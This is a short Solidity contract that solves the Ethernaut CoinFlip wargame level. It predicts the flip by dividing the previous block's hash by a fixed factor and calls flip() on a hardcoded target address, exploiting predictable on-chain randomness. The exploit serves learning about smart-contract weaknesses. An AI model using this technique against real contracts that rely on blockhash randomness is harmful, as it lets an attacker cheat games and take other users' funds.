// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import 'contracts/CoinFlip.sol';

contract hackCoinFlip {
    using SafeMath for uint256;

    // Plug in the original contract address from the ethernaut level 
    CoinFlip public originalContract = CoinFlip(address(0x70197B52f343E099c4B8DC3767f69Af11E68a98C)); 
    
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function hackFlip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        return originalContract.flip(side);
    }
}
